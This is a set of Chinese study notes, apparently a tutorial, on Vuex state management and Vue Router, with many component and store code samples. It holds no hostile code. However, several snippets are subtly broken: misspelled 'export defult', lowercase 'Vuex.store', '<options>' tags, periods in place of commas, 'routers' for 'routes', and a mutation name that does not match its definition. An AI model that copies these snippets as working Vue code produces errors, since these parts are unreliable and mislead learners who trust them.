    <h2>当前求和为：{{sum}}</h2>
    <select v-model.number="n">
  		<options value="1">1</options>
			<options value="2">2</options>
			<options value="3">3</options>
  	</select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>
<script>
	export default{
    name:'Count',
    data(){
      return {
        sum:0.
        n:1.
      }
    },
    methods:{
      increment(){
        this.sum+=this.n
      },
      decrement(){
        this.sum-=this.n
      },
      incrementOdd(){
        if(this.sum %2) this.sum+=this.n
      },
      incrementWait(){
        setTimeout(()=>{
          this.sum+=this.n
        },1000)
      }
    }
  }
</script>
<style>
  button {margin-left: 5px;}
</style>
~~~

### 搭建Vuex环境

1. 下载安装==vuex====<font color='red'>npm i vuex</font>==
2. 创建==src/store/index.js==，该文件用于创建==Vuex==中最核心的==store==

~~~js
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex)

const actions = {}							// 准备actions——用于响应组件中的动作
const mutations = {}						// 准备mutations——用于操作数据(state)
const state = {}								// 准备state——用于存储数据

// 创建并且暴露 store
export defult new Vuex.store({
  actions,
  mutations,
  state
})
~~~

3. 在==src/main.js==中创建==vm==时传入==store==配置项

~~~js
import Vue from 'vue'
import App from './App.vue'
import store from './store'   // 引入store

Vue.config.productionTip = false

new Vue({
  el:'app',
  render:h=>h(app),
  store,
  beforeCreate(){
    Vue.prototype.$bus = this
  }
})
~~~

### 使用Vuex编写

#### vuex的基本使用

1. 初始化数据==state==，配置==actions==、==mutations==、操作文件==store.js==

2. 组件中读取==Vuex==中的数据==<font color='red'>$store.state.数据</font>==

3. 组件中读取==Vuex==中的数据==<font color='red'>$store.dispatch(‘action中的方法名’,数据)</font>==

   或==<font color='red'>$store.commit(‘mutations中的方法名’,数据)</font>

   若没有网络请求或其他业务逻辑，组件中也可越过==actions==，即不屑dispatch，直接编写==commit==

`src/store/index.js`此文件用于创建Vuex中最为核心的store

~~~js
import Vue from 'vue'
import Vuex from 'vuex'  // 引入vuex

Vue.use(Vuex)

// 准备actions——同于响应组件中的个动作
const actions = {
  jia(context,value){   // 两个参数，第一个参数为context 即为上下文，value即为数据
    console.log('actions中的jia被调用了')
    context.commit('JIA',value)   // 调用mutations中的JIA事件
  },
  jian(context,value){
    console.log('actions中的jia被调用了')
    context.commit('JIAN',value)
  },
  jiaOdd(context,value){
    console.log('actions中的jiaOdd被调用了')
    context.commit('JIAODD',value)
  },
  jiaWait(context,value){
    console.log('actions中的jiaWait被调用了')
    setTimeout(()=>{
      context.commit('JIA',value)
    },1000)
  }
}


// 准备mutations——用于操作数据(state)
const mutations = {
  JIA(state,value){
    console.log('mutations中的JIA被调用了')
    state.sum += value
  },
  JIAN(state,value){
    console.log('mutations中的JIAN被调用了')
    state.sum -= value
  }
}

// 准备state——用于存储数据
const state = {
  sum:0  // 当前的和
}



// 创建并暴露store
export default new Vuex.store({
  actions,
  mutations,
  state
})
~~~

`src/components/Count.vue`

~~~vue
<template>
	<div>
    <h1>当前求和为：{{$store.state.sum}}</h1>
    <select v-model.number="n">
    	<options value="1">1</options>
      <options value="2">2</options>
      <options value="3">3</options>
  	</select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>

<script>
	export default{
    name:'Count',
    data(){
      return {
        n:1
      }
    },
    methods:{
      increment(){
        this.$store.commit('JIA',this.n)
      },
      decrement(){
        this.$store.commit('JIAN',this.n)
      },
      incrementOdd(){
        this.$store.dispatch('jiaOdd',this.n)
      },
      incrementWait(){
        this.$store.dispatch('jiaWait',this.n)
      }
    }
  }
</script>
<style lang="css">button{margin-left: 5px;}</style>
~~~

## getters配置项

1. 概念：当==state==中的数据需要经过加工后再使用时，可以使用==<font color='red'>getters</font>==加工，相当于**全局计算属性**

2. 在==store.js==中追加**==getters==**配置

   ~~~js
   ...
   
   const getters = {
     bigSum(state){
       return state.sum * 10
     }
   }
   
   
   export default new Vuex.store({
     ...
     getters
   })
   ~~~

3. 组件中读取数据==$store.getters.bigSum==

   ![getters](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//getters.png)

`src/store/index.js`

~~~js

import Vue from 'vue'	// 引入Vue核心库
import Vuex from 'vuex'	// 引入Vuex

Vue.use(Vuex)	// 应用Vuex插件
   
// 准备actions对象——响应组件中用户的动作
const actions = {
    addOdd(context,value){
        console.log("actions中的addOdd被调用了")
        if(context.state.sum % 2){context.commit('ADD',value)}
    },
    addWait(context,value){
        console.log("actions中的addWait被调用了")
        setTimeout(()=>{context.commit('ADD',value)},500)
    },
}
// 准备mutations对象——修改state中的数据
const mutations = {
    ADD(state,value){state.sum += value},
    SUB(state,value){state.sum -= value}
}
// 准备state对象——保存具体的数据
const state = {
    sum:0 // 当前的和
}
// 准备getters对象——用于将state中的数据进行加工
const getters = {
  bigSum(state){
    return state.sum * 10
  }
}

export default new Vuex.store({
  actions,
  mutations,
  state,
  getters
})
~~~

`src/Count.vue`

~~~vue
<template>
	<div>
		<h1>当前求和为：{{ $store.state.sum }}</h1>
		<h3>当前求和的10倍为：{{ $store.getters.bigSum }}</h3>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment">+</button>
		<button @click="decrement">-</button>
		<button @click="incrementOdd">当前求和为奇数再加</button>
		<button @click="incrementWait">等一等再加</button>
	</div>
</template>

<script>
	export default {
		name:'Count',
		data() {
			return {
				n:1,
			}
		},
		methods: {
			increment(){this.$store.commit('ADD',this.n)},
			decrement(){this.$store.commit('SUBTRACT',this.n)},
			incrementOdd(){this.$store.dispatch('addOdd',this.n)},
			incrementWait(){this.$store.dispatch('addWait',this.n)},
		},
	}
</script>

<style>button{margin-left: 5px;}</style>
~~~

## 四个map方法的使用

1. **mapState方法**：用于帮助映射==state==中的数据为**计算属性**

   ~~~js
   computed:{
     // 借助mapState生成计算属性：sum，school，subject（对象写法）
     ...mapState({sum:'sum',school:'school',subject:'subject'}),
     // 借助mapState生成计算属性：sum、school、subject（数组写法）
     ...mapState(['sum','school','subject']),
   }
   ~~~

2. **mapGetters方法**：用于帮助映射==getters==中的数据为**计算属性**

   ~~~js
   computed:{
     // 借助mapGetters生成计算属性：bigSum（对象写法）
     ...mapGetters(bigSum:'bigSum'),
     // 借助mapGetter生成计算属性：bigSum（数组写法）
     ...mapGetters(['bigSum'])
   }
   ~~~

3. **mapActions方法**：用于帮助生成与==actions==对话的方法，即包含==$store.dispatch(xxx)==的函数

   ~~~js
   methods:{
     // 靠mapActions生成：incrementOdd、incrementWait（对象写法）
     ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'}),
     // 靠mapActions生成：jiaOdd、jiaWait（数组写法）
     ...mapActions(['jiaOdd','jiaWait'])
   }
   ~~~

4. **mapMutations方法**：用于帮助生成与==mutatuins==对话的方法，即包含==$store.commit(xxx)==的函数

   ~~~js
   methods:{
     //靠mapActions生成：increment、decrement（对象形式）
       ...mapMutations({increment:'JIA',decrement:'JIAN'}),
       
       //靠mapMutations生成：JIA、JIAN（对象形式）
       ...mapMutations(['JIA','JIAN']),
   }
   ~~~

   > **注意**：==mapActions==与==mapMutations==使用时，若需要传递参数需要：<font color='red'>在模板中绑定事件时传递好参数</font>，否则参数是事件对象

   `src/components/Count.vue`

   ~~~vue
   <template>
   	<div>
   		<h1>当前求和为：{{ sum }}</h1>
   		<h3>当前求和的10倍为：{{ bigSum }}</h3>
   		<h3>我是{{ name }}，我在{{ school }}学习</h3>
   		<select v-model.number="n">
   			<option value="1">1</option>
   			<option value="2">2</option>
   			<option value="3">3</option>
   		</select>
   		<button @click="increment(n)">+</button>
   		<button @click="decrement(n)">-</button>
   		<button @click="addOdd(n)">当前求和为奇数再加</button>
   		<button @click="addWait(n)">等一等再加</button>
   	</div>
   </template>
   
   <script>
   	import {mapState, mapGetters, mapMutations, mapActions} from 'vuex'	//🔴
   
   	export default {
   		name: 'Count',
   		data() {
   			return {
   				n:1, //用户选择的数字
   			}
   		},
     computed: {		
   			...mapState(['sum','school','name']),
   			...mapGetters(['bigSum'])
   		},
   		methods: {
   			...mapMutations({increment:'ADD', decrement:'SUBTRACT'}),
   			...mapActions(['addOdd', 'addWait'])
   		},
   	}
   </script>
   
   <style>
   	button{
   		margin-left: 5px;
   	}
   </style>
   ~~~

   ## 多组件共享数据案例

   ![多组件共享数据案例](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//多组件共享数据案例.png)

`src/App.vue`

~~~vue
<template>
  <div>
    <Count/><hr/>
    <Person/>
  </div>
</template>

<script>
import Count from "./components/Count.vue";
import Person from "./components/Person.vue";

export default {
  name: "App",
  components: { Count, Person },
};
</script>
~~~

`src/store/index.js`该文件用于创建Vuex中最为核心的store

~~~js
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex)

const actions = {
	jiaOdd(context,value){
		console.log('actions中的jiaOdd被调用了')
		if(context.state.sum % 2){
			context.commit('JIA',value)
		}
	},
	jiaWait(context,value){
		console.log('actions中的jiaWait被调用了')
		setTimeout(()=>{
			context.commit('JIA',value)
		},500)
	}
}

//准备mutations——用于操作数据（state）
const mutations = {
	JIA(state,value){
		console.log('mutations中的JIA被调用了')
		state.sum += value
	},
	JIAN(state,value){
		console.log('mutations中的JIAN被调用了')
		state.sum -= value
	},
	ADD_PERSON(state,value){
		console.log('mutations中的ADD_PERSON被调用了')
		state.personList.unshift(value)
	}
}

//准备state——用于存储数据
const state = {
	sum: 0,
	school: '尚硅谷',
	subject: '前端',
	personList: []
}

//准备getters——用于将state中的数据进行加工
const getters = {
	bigSum(state){
		return state.sum*10
	}
}

//创建并暴露store
export default new Vuex.Store({
	actions,
	mutations,
	state,
	getters
})
~~~

`src/components/Count.vue`

~~~vue
<template>
	<div>
		<h1>当前求和为：{{ sum }}</h1>
		<h3>当前求和放大10倍为：{{ bigSum }}</h3>
		<h3>我在{{ school }}，学习{{ subject }}</h3>
		<h3 style="color:red">Person组件的总人数是：{{ personList.length }}</h3>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment(n)">+</button>
		<button @click="decrement(n)">-</button>
		<button @click="incrementOdd(n)">当前求和为奇数再加</button>
		<button @click="incrementWait(n)">等一等再加</button>
	</div>
</template>

<script>
	import {mapState,mapGetters,mapMutations,mapActions} from 'vuex'
	export default {
		name:'Count',
		data() {
			return {
				n:1, //用户选择的数字
			}
		},
		computed:{
			...mapState(['sum','school','subject','personList']),
			...mapGetters(['bigSum'])
		},
		methods: {
			...mapMutations({increment:'JIA',decrement:'JIAN'}),
			...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
		}
	}
</script>

<style lang="css">button{margin-left: 5px;}</style>
~~~

`src/components/Person.vue`

~~~vue
<template>
	<div>
		<h1>人员列表</h1>
		<h3 style="color:red">Count组件求和为：{{ sum }}</h3>
		<input type="text" placeholder="请输入名字" v-model="name">
		<button @click="add">添加</button>
		<ul>
			<li v-for="p in personList" :key="p.id">{{ p.name }}</li>
		</ul>
	</div>
</template>

<script>
	import {nanoid} from 'nanoid'
  import { mapState } from "vuex"
  
	export default {
		name:'Person',
		data() {
			return {
				name:''
			}
		},
		computed:{
			personList(){return this.$store.state.personList},
			sum(){return this.$store.state.sum}
		},
		methods: {
			add(){
        if (this.name === "") return
				const personObj = {id:nanoid(),name:this.name}
				this.$store.commit('ADD_PERSON',personObj)
				this.name = ''
			}
		},
	}
</script>
~~~

## 模块化+命名空间

1. 目的：让代码更好维护，让多种数据分类更加明确

2. 修改==store.js==

   为了解决不同模块命名冲突的问题，将不同模块的==<font color='red'>namespaced:true</font>==,之后在不同页面引入==getter==、==actions==、==mutations==时，需要加上所属的模块名

   src/stote/index.js

   ~~~js
   const countAbout = {
     namespaced: true,	// 开启命名空间
     state: {x:1},
     mutations: { ... },
     actions: { ... },
     getters: {
       bigSum(state){ return state.sum * 10 }
     }
   }
   
   const personAbout = {
     namespaced: true,	// 开启命名空间
     state: { ... },
     mutations: { ... },
     actions: { ... }
   }
   
   const store = new Vuex.Store({
     modules: {
       countAbout,
       personAbout
     }
   })
   ~~~

3. 开启命名空间后，组件中读取==state==数据

   ~~~js
   // 方式一：自己直接读取
   this.$store.state.personAbout.list
   // 方式二：借助mapState读取：
   ...mapState('countAbout',['sum','school','subject']),
   ~~~

4. 开启命名空间后，组件中读取==getters==数据

   ~~~js
   //方式一：自己直接读取
   this.$store.getters['personAbout/firstPersonName']
   //方式二：借助mapGetters读取：
   ...mapGetters('countAbout',['bigSum'])
   ~~~

5. 开启命名空间后，组件中读取==dispatch==数据

   ~~~js
   //方式一：自己直接dispatch
   this.$store.dispatch('personAbout/addPersonWang',person)
   //方式二：借助mapActions：
   ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   ~~~

6. 开启命名空间后，组件中读取==commit==数据

   ~~~js
   //方式一：自己直接commit
   this.$store.commit('personAbout/ADD_PERSON',person)
   //方式二：借助mapMutations：
   ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
   ~~~

   ![求和案例示例图2](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//求和案例示例图2.png)

   `src/store/index.js`

   ~~~js
   
   import Vue from 'vue'
   import Vuex from 'vuex'
   import countOptions from './count'		// 引入count
   import personOptions from './person'	// 引入person
   
   Vue.use(Vuex)
      
   //创建并暴露store
   export default new Vuex.Store({
       modules:{
           countAbout:countOptions,
           personAbout:personOptions,
       }
   })
   ~~~

   `src/store/count.js`

   ~~~js
   
   export default {
       namespaced:true,
       actions: {
           addOdd(context,value){
               console.log("actions中的addOdd被调用了")
               if(context.state.sum % 2){
                   context.commit('ADD',value)
               }
           },
           addWait(context,value){
               console.log("actions中的addWait被调用了")
               setTimeout(()=>{
                   context.commit('ADD',value)
               },500)
           }
       },
       mutations: {
           ADD(state,value){ state.sum += value },
           SUBTRACT(state,value){ state.sum -= value }
       },
       state: {
           sum:0,
           school:'尚硅谷',
         	subject: '前端'
       },
       getters: {
           bigSum(state){ return state.sum * 10 }
       }
   }
   ~~~

   `src/store/person.js`

   ~~~js
   import axios from "axios"
   import { nanoid } from "nanoid"
   
   export default{
       namespaced:true,
       actions:{
           addPersonWang(context,value){
               if(value.name.indexOf('王') === 0){
                   context.commit('ADD_PERSON',value)
               }else{
                   alert('添加的人必须姓王！')
               }
           },
           addPersonServer(context){
               axios.get('http://api.uixsj.cn/hitokoto/get?type=social').then(
                   response => {
                       context.commit('ADD_PERSON',{id:nanoid(),name:response.data})
                   },
                   error => { alert(error.message) }
               )
           }
       },
       mutations:{
           ADD_PERSON(state,value){
               console.log('mutations中的ADD_PERSON被调用了')
               state.personList.unshift(value)
           }
       },
       state:{
           personList:[]
       },
       getters:{
           firstPersonName(state){ return state.personList[0].name }
       }
   }
   ~~~

   `src/components/Count.vue`

   ~~~vue
   <template>
   	<div>
   		<h1>当前求和为：{{ sum }}</h1>
   		<h3>当前求和的10倍为：{{ bigSum }}</h3>
   		<h3>我是{{ name }}，我在{{ school }}学习</h3>
   		<h3 style="color:red">Person组件的总人数是：{{ personList.length }}</h3>
   		<select v-model.number="n">
   			<option value="1">1</option>
   			<option value="2">2</option>
   			<option value="3">3</option>
   		</select>
   		<button @click="increment(n)">+</button>
   		<button @click="decrement(n)">-</button>
   		<button @click="incrementOdd(n)">当前求和为奇数再加</button>
   		<button @click="incrementWait(n)">等一等再加</button>
   	</div>
   </template>
   
   <script>
   	import {mapState,mapGetters,mapMutations,mapActions} from 'vuex'
   
   	export default {
   		name:'Count',
   		data() {
   			return {
   				n:1, // 用户选择的数字
   			}
   		},
       computed:{
   			...mapState('countAbout',['sum','school','name']),
         ...mapState('personAbout',['personList']),
   			...mapGetters('countAbout',['bigSum']),
   		}
   		methods: {
   			...mapMutations('countAbout',{increment:'ADD',decrement:'SUBTRACT'}),
   			...mapActions('countAbout',{incrementOdd:'addOdd',incrementWait:'addWait'})
   		},
   	}
   </script>
   
   <style>button{margin-left: 5px;}</style>
   ~~~

   `src/components/Person.vue`

   ~~~vue
   <template>
   	<div>
   		<h1>人员列表</h1>
   		<h3 style="color:red">Count组件求和为：{{ sum }}</h3>
           <h3>列表中第一个人的名字是：{{ firstPersonName }}</h3>
   		<input type="text" placeholder="请输入名字" v-model="name">
   		<button @click="add">添加</button>
           <button @click="addWang">添加一个姓王的人</button>
           <button @click="addPerson">随机添加一个人</button>
   		<ul>
   			<li v-for="p in personList" :key="p.id">{{ p.name }}</li>
   		</ul>
   	</div>
   </template>
   
   <script>
   	import {nanoid} from 'nanoid'
   	export default {
   		name: 'Person',
   		data() {
   			return {
   				name:''
   			}
   		},
   		computed: {
   			personList(){
   				return this.$store.state.personAbout.personList
   			},
   			sum(){
   				return this.$store.state.countAbout.sum
   			},
         firstPersonName(){
           return this.$store.getters['personAbout/firstPersonName']
         }
   		},
   		methods: {
   			add(){
   				const personObj = {id:nanoid(),name:this.name}
   				this.$store.commit('personAbout/ADD_PERSON',personObj)
   				this.name = ''
   			},
         addWang(){
           const personObj = {id:nanoid(),name:this.name}
           this.$store.dispatch('personAbout/addPersonWang',personObj)
           this.name = ''   
         },
         addPerson(){
           this.$store.dispatch('personAbout/addPersonServer')
         }
   		},
   	}
   </script>
   ~~~

# Vue Router 相关理解 基本路由 多级路由

## 相关理解

### vue-router的理解

- ==vue==的一个插件库，用来实现==SPA==应用

### 对SPA应用的理解

1. 单页==web==应用，(single page web application, SPA)
2. 整个应用**<font color='red'>只有一个完整的页面</font>**
3. 点击页面中的导航链接<font color='red'>**不会刷新**</font>页面，只会做页面的**<font color='red'>局部更新</font>**
4. 数据需要通过==ajax==请求获取

![SPA](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//SPA.png)

### 路由的理解

1. 什么是路由
   - 一个路由就是一组映射关系（key-value）
   - ==key==为**路径**,==value==可能是==function==或==component==
2. 路由分类
   - 后端路由
     - 理解：==value==是==function==，用于处理客户端提交的请求
     - 工作过程：服务器收到一个请求时，根据请求路径找到匹配的喊出来处理请求，返回响应数据
   - 前端路由
     - 理解：==value==就是==component==，用于展示页面内容
     - 工作过程：当浏览器的路径改变时，对应的组件就会显示

## 基本路由

1. 安装==vue-router====<font color='red'>npm i vue-router</font>==

2. 应用插件==<font color='red'>Vue.use(VueRouter)</font>==

3. 编写==router==配置项

   ~~~js
   import About from '../compnents/About'   // 路由组件
   import Home from './components/Home'
   
   // 创建router实例对象，去管理一组一组的路由规则
   const router = new VueRouter({
     routes:[
       {
         path:'/about',
         component:About
       },
       {
         path:'/home',
         component:Home
       }
     ]
   })
   
   export default router
   ~~~

4. 实现切换

   ==<font color='red'><router-link></router-link></font>==浏览器会被替换为==a==标签

   ==<font color='red'>active-class</font>==可配置高亮样式

   ~~~vue
   <router-link active-class="active" to="/about">About</router-link>
   ~~~

5. 指定展示位置==<font color='red'><router-view></rouret-view></font>==

   ![路由1](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//路由1.png)

   `src/router/index.js`

   ~~~js
   import VueRouter from 'vue-router'
   // 引入组件
   import About from '../components/About'
   import Home from '../components/Home'
   
   export default new VueRouter({
     routes:[
       {
         path:'/about',
         component:About
       },
       {
         path:'/home',
         component:Home
       }
     ]
   })
   ~~~

   `src/main.js`

   ~~~js
   import Vue from 'vue'
   import App from './App.vue'
   import VueRouter from 'vue-router'   //引入vue-router
   import router from './router'
   
   Vue.config.productionTip = false
   
   Vue.use(VueRouter)
   
   new Vue({
     el:'#app',
     render:h=>h(App),
     router:router
   })
   ~~~

   `src/App.vue`

   ~~~vue
   <template>
     <div>
       <div class="row">
         <div class="col-xs-offset-2 col-xs-8">
           <div class="page-header"><h2>Vue Router Demo</h2></div>
         </div>
       </div>
       <div class="row">
         <div class="col-xs-2 col-xs-offset-2">
           <div class="list-group">
   					<!-- 原始html中我们使用a标签实现页面的跳转 -->
             <!-- <a class="list-group-item active" href="./about.html">About</a> -->
             <!-- <a class="list-group-item" href="./home.html">Home</a> -->
   
   					<!-- Vue中借助router-link标签实现路由的切换 -->
   					<router-link class="list-group-item" 
                          active-class="active" to="/about">About</router-link>
             <router-link class="list-group-item" 
                          active-class="active" to="/home">Home</router-link>
           </div>
         </div>
         <div class="col-xs-6">
           <div class="panel">
             <div class="panel-body">
   						<!-- 指定组件的呈现位置 -->
               <router-view></router-view>
             </div>
           </div>
         </div>
       </div>
     </div>
   </template>
   
   <script>
   	export default {
   		name:'App'
   	}
   </script>
   ~~~

   `src/components/Home.vue`

   ~~~vue
   <template>
   	<h2>我是Home的内容</h2>
   </template>
   
   <script>
   	export default {
   		name:'Home'
   	}
   </script>
   ~~~

   `src/components/About.vue`

   ~~~vue
   
   <template>
   	<h2>我是About的内容</h2>
   </template>
   
   <script>
   	export default {
   		name:'About'
   	}
   </script>
   ~~~

## 几个注意事项

1. 路由组件通常存放在==pages==文件夹，一般组件通常存放在==components==文件夹

   比如上一节的案例就可以修改为

   `src/pages/Home.vue`

   `src/pages/About.vue`

   `src/router/index.js`

   `src/components/Banner.vue`

   `src/App.vue`

2. 通过切换，“隐藏” 了的路由组件，**默认是被销毁了的，需要的时候再去挂载**
3. 每个组件都有自己的==<font color='red'>$route</font>==属性，里面存储着自己的路由信息
4. 整个应用只有一个router，可以通过组建的==<font color='red'>$router</font>==属性获取到

~~~js
// 该文件专门用于创建整个应用的路由器
import VueRouter from "vue-router";
import Home from '../pages/Home'
import About from '../pages/About'

export default new VueRouter({
    routes:[
        {
            path:'/about',
            component:About
        },
        {
            path:'/home',
            component:Home
        }
    ]
})
~~~

~~~vue
<template>
    <div class="col-xs-offset-2 col-xs-8">
        <div class="page-header"><h2>Vue Router Demo</h2></div>
    </div>
</template>

<script>
    export default {
        name:'Banner'
    }
</script>
~~~

~~~vue
<template>
  <div>
    <div class="row">
      <Banner/>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- 原始html中我们使用a标签实现页面跳转 -->
          <!-- <a class="list-group-item active" href="./about.html">About</a>
           <a class="list-group-item" href="./home.html">Home</a> -->
          <!-- Vue中借助router-link标签实现路由的切换 -->
          <router-link class="list-group-item" active-class="active" to="/about">
            About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">
            Home</router-link>
				</div>
			</div>
			<div class="col-xs-6">
				<div class="panel">
					<div class="panel-body">
						<!-- 指定组件的呈现位置 -->
						<router-view></router-view>
					</div>
				</div>
			</div>
		</div>
	</div>
</template>

<script>
	import Banner from './components/Banner.vue'
	export default {
		name:'App',
		components:{ Banner }
	}
</script>
~~~

## 多级路由

1. 配置路由规则，使用==<font color='red'>children</font>==配置项

   ~~~js
   routers:[
     {
       path:'/about',
       component:About
     },
     {
       path:'/home',
       component:Home,
       children:[								// 通过children配置子级路由
         {
           path:'news',					// 此处一定不要带斜杠，写成 /news
           component:News
         },
         {
           path:'message',				// 此处一定不要写成 /message
           component:Message
         }
       ]
     }
   ]
   ~~~

   > 注意二级路由一定不要写/news，二级路由省略/

2. 跳转(要写完整路径)

~~~vue
<router-link to="/home/news">News</router-link>
~~~

![路由2](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//路由2.png)

`src/pages/Home.vue`

~~~vue
<template>
	<div>
		<h2>Home组件内容</h2>
		<div>
			<ul class="nav nav-tabs">
				<li><router-link class="list-group-item" 
                       active-class="active" to="/home/news">News</router-link></li>
				<li><router-link class="list-group-item" 
                       active-class="active" to="/home/message">Message</router-link></li>
			</ul>
			<router-view></router-view>
		</div>
	</div>
</template>

<script>
	export default {
		name:'Home',
	}
</script>
~~~

`src/pages/News.vue`

~~~vue
<template>
    <ul>
        <li>news001</li>
        <li>news002</li>
        <li>news003</li>
    </ul>
</template>

<script>
    export default {
        name:'News'
    }
</script>
~~~

`src/pages/Message.vue`

~~~vue
<template>
    <ul>
        <li>
            <a href="/message1">message001</a>&nbsp;&nbsp;
        </li>
        <li>
            <a href="/message2">message002</a>&nbsp;&nbsp;
        </li>
        <li>
            <a href="/message/3">message003</a>&nbsp;&nbsp;
        </li>
    </ul>
</template>

<script>
    export default {
        name:'News'
    }
</script>
~~~

`src/router/index.js`

~~~js
//该文件专门用于创建整个应用的路由器
import VueRouter from "vue-router";
//引入组件
import Home from '../pages/Home'
import About from '../pages/About'
import News from '../pages/News'
import Message from '../pages/Message'

//创建并暴露一个路由器
export default new VueRouter({
    routes:[
        {
            path:'/about',
            component:About
        },
        {
            path:'/home',
            component:Home,
            children:[
                {
                    path:'news',
                    component:News
                },
                {
                    path:'message',
                    component:Message
                }
            ]
        }
    ]
})
~~~

# Vue Router query 命名路由 params props

## 路由的query参数

1. 传递参数

   ~~~vue
   <!-- 跳转并携带query参数，to的字符串写法 -->
   <router-link :to="`/home/message.detail?id=${m.id}&title=${m.title}`">跳转</router-link>
   
   <!-- 跳转并携带query参数，to的对象写法(推荐) -->
   <router-link :to="{
                     path:'/home/message/detail',
                     query:{
                     	id:m.id,
                     	title:m.title
                     }
                     }">跳转</router-link>
   ~~~

2. 接收参数

~~~js
$route.query.id
$route.query.title
~~~

![路由3](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//路由3.png)

`src/router.index.js`

~~~js
import VueRouter from "vue-router";
import Home from '../pages/Home'
import About from '../pages/About'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

// 创建并暴露一个路由器
export default new VueRouter({
  routes:[
    {
      path:'/about',
      component:About
    },
    {
      path:'/home',
      component:Home,
      children:[
        {
          path:'news',
          component:News
        },
        {
          path:'message',
          component:Message,
          children:[
            {
              path:'detail',
              component:Detail
            }
          ]
        }
      ]
    }
  ]
})
~~~

`src/pages/Message.vue`

~~~vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带query参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">
                      {{m.title}}
    				 </router-link>&nbsp;&nbsp; -->

        <!-- 跳转路由并携带query参数，to的对象写法 -->
        <router-link :to="{
                            path:'/home/message/detail',
                            query:{
                              id:m.id,
                              title:m.title
                            }
                          }">
          {{m.title}}
      </router-link>&nbsp;&nbsp;
      </li>
    </ul>
    <hr/>
    <router-view></router-view>
  </div>
</template>

<script>
  export default {
    name:'News',
    data(){
      return{
        messageList:[
          {id:'001',title:'消息001'},
          {id:'002',title:'消息002'},
          {id:'003',title:'消息003'}
        ]
      }
    }
  }
</script>
~~~

`src/pages/Detail.vue`

~~~vue
<template>
    <ul>
        <li>消息编号：{{ $route.query.id }}</li>
        <li>消息标题：{{ $route.query.title }}</li>
    </ul>
</template>

<script>
    export default {
        name:'Detail'
    }
</script>
~~~

## 命名路由

1. 作用：可以简化路由的跳转

2. 如何使用

   - 给路由命名

     ~~~js
     {
     	path:'/demo',
     	component:Demo,
     	children:[
     		{
     			path:'test',
     			component:Test,
     			children:[
     				{
               name:'hello' // 给路由命名
     					path:'welcome',
     					component:Hello,
     				}
     			]
     		}
     	]
     }
     ~~~

   - 简化跳转

~~~vue
<!--简化前，需要写完整的路径 -->
<router-link to="/demo/test/welcome">跳转</router-link>

<!--简化后，直接通过名字跳转 -->
<router-link :to="{name:'hello'}">跳转</router-link>

<!--简化写法配合传递参数 -->
<router-link 
	:to="{
		name:'hello',
		query:{
		    id:666,
        title:'你好'
		}
	}"
>跳转</router-link>
~~~

`src/router/index.js`

~~~js
import VueRouter from "vue-router";
import Home from '../pages/Home'
import About from '../pages/About'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

export default new VueRouter({
    routes:[
        {
            path:'/about',
            component:About
        },
        {
            path:'/home',
            component:Home,
            children:[
                {
                    path:'news',
                    component:News
                },
                {
                    path:'message',
                    component:Message,
                    children:[
                        {
                            name:'detail',	// name配置项为路由命名
                            path:'detail',
                            component:Detail
                        }
                    ]
                }
            ]
        }
    ]
})
~~~

`src/pages/Message.vue`

~~~vue
<template>
    <div>
        <ul>
            <li v-for="m in messageList" :key="m.id">
                <!-- 跳转路由并携带query参数，to的字符串写法 -->
                <!-- <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">
                    {{m.title}}
                </router-link>&nbsp;&nbsp; -->

                <!-- 跳转路由并携带query参数，to的对象写法 -->
                <router-link :to="{
                    name:'detail',	//使用name进行跳转
                    query:{
                        id:m.id,
                        title:m.title
                    }
                }">
                    {{m.title}}
                </router-link>&nbsp;&nbsp;
            </li>
        </ul>
        <hr/>
        <router-view></router-view>
    </div>
</template>

<script>
    export default {
        name:'News',
        data(){
            return{
                messageList:[
                    {id:'001',title:'消息001'},
                    {id:'002',title:'消息002'},
                    {id:'003',title:'消息003'}
                ]
            }
        }
    }
</script>
~~~

## 路由的params参数

1. 配置路由，声明接收==<font color='red'>params</font>==参数

   ~~~js
   
   {
   	path:'/home',
   	component:Home,
   	children:[
   		{
   			path:'news',
   			component:News
   		},
   		{
   			component:Message,
   			children:[
   				{
   					name:'xiangqing',
   					path:'detail/:id/:title', // 🔴使用占位符声明接收params参数
   					component:Detail
   				}
   			]
   		}
   	]
   }
   ~~~

2. 传递参数

   特别注意：路由携带==params==参数时，若使用==to==的对象写法，则**不能使用==path==配置项，必须使用==<font color='red'>name</font>==配置**

   ~~~vue
   
   <!-- 跳转并携带params参数，to的字符串写法 -->
   <router-link :to="/home/message/detail/666/你好">跳转</router-link>
   				
   <!-- 跳转并携带params参数，to的对象写法 -->
   <router-link 
   	:to="{
   		name:'xiangqing',
   		params:{
   		   id:666,
          title:'你好'
   		}
   	}"
   >跳转</router-link>
